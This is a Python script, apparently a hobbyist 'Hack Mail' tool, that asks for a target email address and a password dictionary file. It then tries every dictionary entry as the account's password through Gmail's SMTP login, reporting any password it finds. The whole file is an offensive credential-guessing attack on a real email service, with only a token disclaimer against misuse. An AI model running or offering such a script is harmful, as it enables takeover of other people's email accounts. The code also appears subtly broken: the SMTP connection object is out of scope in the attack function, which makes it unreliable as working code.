"""
Author          : MaxMouse/Chenura Winrada
Date created    : 7/21/2022
Last modified   : 7/23/2022
Time            : 06.57 PM
"""

import smtplib
import colorama
from colorama import init, Fore
import datetime
import time
import sys
import os
init()
g = Fore.GREEN
r = Fore.RED
c = Fore.CYAN
w = Fore.WHITE
y = Fore.YELLOW

def logo():
    print("******************************************************************************")
    print(f"""
    {g}
     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀    ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒    ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
    ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
    ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
     ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░      ░     ░   ▒    ▒ ░  ░ ░   
     ░  ░  ░      ░  ░░ ░      ░  ░             ░         ░  ░ ░      ░  ░
    """)
    print(f"{w}By- {c}MaxMouse{g}\n".center(90))
    print("******************************************************************************")
    delay(2)

def delay(secs):
    time.sleep(secs)

os.system('cls')
def bannar(user, passwordfile, port):
    print(f"{y}Attack lounched!{g}")
    print(f"""----------------------------------------------------
    
    Target  : {w}{user}
    {g}Started : {w}{datetime.datetime.ctime(datetime.datetime.now())}
    {g}File    : {w}{passwordfile}
    {g}Port    : {w}{port}{g}

----------------------------------------------------""")

def start(user, passwordfile, port):
    try:
        os.system('cls')
        print(f"{g}[{w}Info{g}]{c}Connecting to the server....{g}")
        smtp_server = smtplib.SMTP("smtp.gmail.com", port)
        smtp_server.ehlo()
        smtp_server.starttls()
        print(f"{g}[{w}Info{g}]{c}Server connected!{g}\n")
        delay(1)
        bannar(user, passwordfile, port)
        atack(user, passwordfile)
    except Exception as err:
        print(f"{g}[{r}ERROR{g}]{w}Server connection failed!{g}")
        print(f"""{c}\nDetails:
    {y}{err}""")
        sys.exit(0)
def atack(user, passwordfile):
    try:
        file = open(passwordfile, "r")
        
        for line in file:
            line = line.strip("\n")
            try:
                smtp_server.login(user, line)
                print(f"{g}[{c}KEY{g}]Password found!: {c}{line}{g}")
                print(f"{g}Finished: {w}{datetime.datetime.ctime(datetime.datetime.now())}{g}")
                sys.exit(0)
            except Exception:
                print(f"{g}[{r}-{g}]{r}Didn't matched! trying another one!{g}")
        print(f"\n{g}Finished: {w}{datetime.datetime.ctime(datetime.datetime.now())}{g}")
        sys.exit(0)
    except Exception as err:
        print(f"{r}{err}{g}")
        print(f"\n{g}Finished: {w}{datetime.datetime.ctime(datetime.datetime.now())}{g}")
        sys.exit(0)
try:
    logo()
    print(f"{g}[{w}Info{g}]{w}This tool not supported for two-step verified emails!")
    print(f"""{g}[{y}WARNING!{g}]{c}This tool is not made for any {r}critical{c} activities.
    So do not use this tool to damage anyone!\n""")
    delay(2)
    try:
        user = input(f"{w}Enter the targeted email : {g}")
        passwordfile = input(f"{w}Enter the dictionary file: {g}")
        port = int(input(f"{w}Enter the port({c}Ex: 587{w})  : {g}"))
        start(user, passwordfile, port)
    except KeyboardInterrupt:
        print(f"{w}Cancelled{g}")
        sys.exit(0)
    except ValueError:
        print("\nEnter valied data!")
        sys.exit(0)
except KeyboardInterrupt:
    print(f"{w}Cancelled{g}")
    sys.exit(0)